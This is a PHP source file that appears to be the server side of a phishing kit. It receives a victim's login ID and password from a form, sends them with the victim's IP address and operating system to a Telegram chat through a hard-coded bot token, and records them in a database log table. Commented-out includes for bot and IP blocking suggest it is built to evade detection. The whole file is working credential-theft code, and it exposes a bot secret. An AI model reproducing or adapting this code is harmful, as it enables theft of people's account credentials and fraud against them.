<?php
session_start();
//error_reporting(1);

include('conn.php');
//include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$browserid = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
include 'rm.php';
$VictimInfo = "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
#################################################
#       SYSTEM & BROWSER                        #
#################################################
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

##OS##
function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}
$os        =   getOS();
##--##
if (!isset($_POST['id']) || $_POST['id'] == '') {
  die("<script type='text/javascript'>top.location ='index.php?$rand_tarikh';</script>");
}
if (!isset($_POST['oooo']) || $_POST['oooo'] == '') {
  die("<script type='text/javascript'>top.location ='index.php?$rand_tarikh';</script>");
}



$loto = $_POST['id'];
$bobo = $_POST['oooo'];
$ziro = '4';
$message .= "+ Information +\r\n";
$message .= "| IP     : " . $_SERVER['REMOTE_ADDR'] . ")\r\n";
$message .= "| ID     : " . $_POST['id'] . "\r\n";
$message .= "| Pass   : " . $_POST['oooo']  . "\r\n";
$message .= "| System : " . $os  . "\r\n";
$message .= "+ ------------------------------------------+\r\n\r\n";

$token = "1171787562:AAHfMi62vDv653oh0Q4E7ujz3rLEse7qbkM"; $chatid = "-400095465"; sendMessage($chatid, $message, $token);

$is_existe  = 'SELECT * FROM log WHERE login = :login';

$stmt = $pdo->prepare($is_existe);
$stmt->execute(array(
  ':login' => $loto ,
));



$hhh = $stmt->fetch();


    if($hhh['login'] ==  $_POST['id'] ){
 

  $id  = $hhh['id'];
		  
		  $sql = "UPDATE log set login = :login, password = :password, system = :system, created = :created, ip = :ip WHERE id = :id";

$stmt = $pdo->prepare($sql);
$stmt->execute(array(
  ':id' => $id,
  ':login' => $loto,
  ':password' => $bobo,
  ':system' => $os,
  ':created' => time(),
  ':ip' => $ip,
));

   
		  
   
       }
        else{ 
		
 echo "else";
      $sql = "INSERT INTO log (login, password, system, created, ip, showtextcode)
VALUES (:login, :password, :system, :created, :ip, :showtextcode)";


      $stmt = $pdo->prepare($sql);

      $stmt->execute(array(
          ':login' => $loto,
          ':password' => $bobo,
		  ':system' => $os,
          ':created' => time(),
          ':ip' => $ip,
          ':showtextcode' => $ziro,
      ));
      
     }